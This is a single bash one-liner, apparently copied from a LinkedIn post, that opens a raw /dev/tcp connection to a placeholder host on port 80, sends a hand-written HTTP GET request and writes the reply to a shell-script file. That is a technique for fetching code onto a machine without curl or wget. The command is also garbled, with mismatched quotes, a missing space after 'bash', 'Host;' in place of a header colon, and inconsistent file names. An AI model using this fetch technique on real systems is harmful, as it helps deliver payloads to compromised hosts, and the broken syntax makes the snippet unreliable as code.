bash-c "exec 3<>/dev/tcp/IP/80; echo -e GET/ youfile.sh HTTP/1.1\r\nHost; ip\r\nConnection: close\r\n\r\n' >&3; cat <&3-> yourfile.sh'

Source: Linkedin | Harvey Spec
